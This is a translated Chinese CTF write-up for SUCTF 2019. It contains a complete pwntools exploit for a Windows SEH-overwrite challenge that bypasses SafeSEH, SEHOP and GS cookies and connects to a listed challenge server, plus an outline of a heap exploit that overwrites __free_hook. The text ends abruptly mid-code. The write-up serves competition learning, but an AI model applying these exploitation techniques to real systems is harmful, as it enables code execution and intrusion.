# kn0ck suctf19 writeup
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
> kn0ck诚招大佬，联系邮箱[PI:EMAIL](mailto:PI:EMAIL)
## pwn
###  BabyStack
main函数的f5有点问题,所以直接看反汇编
    .text:00408579                 mov     esp, [ebp+ms_exc.old_esp]
    .text:0040857C                 call    sub_4033C8 ;这个函数里面有getflag的代码段,先想想怎么进去
    发现00408579地址是异常处理函数
    而在text:00408542 loc_408542:                             ; CODE XREF: sub_4083E0:loc_40853C↑p
    .text:00408542                 pop     eax
    .text:00408543                 mov     esi, [ebp+var_2C]
    .text:00408546                 sub     esi, eax
    .text:00408548                 div     esi
    .text:0040854A                 pop     eax
    .text:0040854B                 push    offset aYouCanNotFindM ; "You can not find Me!n"
    .text:00408550                 call    printf
有div指令,应该是除0异常触发,因为输入只能输入8字节,否则报错退出,  
要求esi=0,就必须要求esi==eax,此时的eax刚好是前面一个call的返回值,也就是00408541,由于程序开启了aslr,所以就利用到了泄露出来的main函数地址了,需要动态根据前面的算法构造出输入的8字节.
407F60这个函数里面有任意地址读取,读取异常的话进行异常处理函数会直接退出.
当输入no的时候会判断2个初始值为1的局部变量的和是否==3,==才getflag,否则退出
现在是怎么改掉这2个值  
sub_402C70((int)&v11, 256, (int)v1);这个函数可以让v11溢出,可以修改返回地址,但是不能修改掉2个局部变量,
可函数退出的地方都是exit,不是正常退出,好像也无法劫持eip
    .text:00408224 loc_408224:                             ; DATA XREF: .rdata:stru_47ACC0↓o
    .text:00408224                 mov     eax, 1
    .text:00408229                 retn
这里是个正常返回的地方,但是是在异常处理函数里面,前面有jmp直接跳过它,又不能直接运行到这里来,想想看能否触发异常来到这里.
触发异常来到这里后发现esp已经改掉了,还是无法劫持eip
换思路,可以直接通过修改seh中的函数指针,由于泄露了栈,所以可以保证seh链是完整的绕过sehop.覆盖第一个seh链为getflag函数,再触发异常  
但是好像还有safeseh相关保护需要绕过…………
根据这篇文章 绕过safeseh  
最后一个坑,浪费了好多时间,最后的scope_addr后面的0不能被破坏,不然直接退出,经过调试发现会有个换行符插进去了,补上他们就好了
    from pwn import *
    import string
    t = remote('121.40.159.66', 6666)
    #t = remote('1.1.8.1', 9999)
    def calc_esi(ret_addr):
        ret_addr = hex(ret_addr)[2:].zfill(8)
        esi = ''
        for i in ret_addr:
            if i in '1234567890':
                esi+=chr(ord(i)+3)
            elif i in string.ascii_letters:
                esi+=chr(ord(i)+55)
        return esi
    #通过第一阶段验证
    print t.recvuntil('stack address = ')
    stack_addr = t.recvline()[2:-2]
    print stack_addr
    stack_addr = int(stack_addr,16)
    print t.recvuntil('main address = ')
    main_addr = t.recvline()[2:-2]
    print main_addr
    main_addr_num = int(main_addr,16)
    ret_addr = main_addr_num+0x4be3
    esi = calc_esi(ret_addr)
    print 'esi= ',esi
    #esi = hex(ret_addr)[2:].zfill(8)
    t.sendline(esi)
    #泄露seh_next
    print t.recvuntil('to know more?')
    t.sendline('yes')
    print t.recvuntil('do you want to know?')
    seh_next_addr = stack_addr-(0x19ff10-0x19fee0)
    print 'seh_next_addr: ',hex(seh_next_addr)
    t.sendline(str(seh_next_addr))
    print t.recvuntil('value is 0x')
    seh_next = t.recvuntil('rn')[:-2]
    print 'seh_next: ',seh_next
    seh_next = int(seh_next,16)
    #泄露seh_next后面的seh_handler
    print t.recvuntil('to know more?rn')
    t.sendline('yes')
    print t.recvuntil('do you want to know?rn')
    handler_addr = stack_addr-(0x19ff10-0x19fee4)
    print 'handler: ',hex(handler_addr)
    t.sendline(str(handler_addr))
    print t.recvuntil('value is 0x')
    handler = t.recvuntil('rn')[:-2]
    print 'handler: ',handler
    handler = int(handler,16)
    #泄露栈上面的gscookie
    print t.recvuntil('to know more?rn')
    t.sendline('yes')
    print t.recvuntil('do you want to know?rn')
    cookie = stack_addr-(0x19ff10-0x19fed4)
    print 'cookie addr: ',hex(cookie)
    t.sendline(str(cookie))
    print t.recvuntil('value is 0x')
    cookie = t.recvuntil('rn')[:-2]
    print 'cookie: ',cookie
    cookie = int(cookie,16)
    #泄露security cookie
    print t.recvuntil('to know more?rn')
    t.sendline('yes')
    print t.recvuntil('do you want to know?rn')
    sc = 0x47C004-0x40395e+ main_addr_num
    print 'sc addr: ',hex(sc)
    t.sendline(str(sc))
    print t.recvuntil('value is ')
    sc = t.recvuntil('rn')[2:-2]
    print 'sc: ',sc
    sc = int(sc,16)
    #计算ebp
    ebp = stack_addr-(0x19ff10-0x19fef0)
    print 'ebp: ',hex(ebp)
    #计算buf地址,计算scope指针
    buf_addr = stack_addr-(0x19FF10-0x019FE44)
    print 'buf_addr:', hex(buf_addr)
    scope_addr = (buf_addr+4)^sc
    print 'scope_addr: ',hex(scope_addr)
    print t.recvuntil('to know more?rn')
    t.sendline('1')
    '''
    payload 
    '''
    getflag_addr = main_addr_num+0x0408266-0x40395E#计算getflag地址
    payload = 'aaaa'
    #把fake scope放在后4字节是因为之后会输入yes破坏前4字节
    payload += 'xE4xFFxFFxFFx00x00x00x00x0CxFFxFFxFFx00x00x00x00xFExFFxFFxFF'+p32(getflag_addr)*2
    #padding
    payload +='x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x31x31x31x00x32x31x32x00x00x00x00x00x00x00x00x00'
    payload +=p32(cookie)+'3'*8+p32(seh_next)+p32(handler)+p32(scope_addr)+p32(0)+p32(ebp)
    print(len(payload))
    t.sendline(payload)
    print t.recvuntil('you want to know more?rn')
    t.sendline('yes')
    print t.recvuntil('n')
    t.sendline('111')#再次触发异常,进入getflag代码
    print t.interactive()
###  二手破电脑
此题先看两个函数，`malloc_usable_size` 和 `realloc`。
在linux下，使用 `man malloc_useable_size` 即可快速查看函数定义、用法等。
    The malloc_usable_size() function returns the number of usable bytes in the block pointed to by ptr, a pointer
           to a block of memory allocated by malloc(3) or a related function.
再看看源码，大概就是，32位系统下，如果堆块是inuse的，就返回堆块大小-4，否则返回堆块大小-8。
`realloc` 就有意思了，按照源码，是先 `malloc` ，然后 `memcpy` 再 `free`，实测该程序并不会进行 `malloc` 或者
`free`，因为大小没改变，但是对堆块的 `size` 进行了检查。
然后查找漏洞，漏洞不太明显，在 `perchase` 函数的 `scanf` 函数处，例如 `%8s`
这样的格式化字符串，实际会写入9个字节，因为有最后一个 `x00` 会被写进去。
解题思路：
  * 利用 `unsorted bin` 泄露堆地址
  * 伪造 `pre_inuse` ，利用一字节溢出，修改下一堆块的`inuse` 标志位
  * 利用 `free` 的向前合并，造成堆块的 `overlap`
  * 篡改某一结构体的 `name` 指针，使其指向一个伪造的堆块，堆块位置自身结构体之前，且大小符合条件
  * 调用 `rename` 函数，`realloc` 后 `name` 指针通过检查，写入数据即可再次修改 `name` 指针至 `__free_hook` 处，接下来还有一次对 `name` 指针进行写的机会，写入 `system` 即可。
关于libc，吐槽一下主办方用的非主流libc：libc6-i386_2.23-0ubuntu10_amd64.so
另外有个serial需要解一下
    for ( i = 0; i qwd!"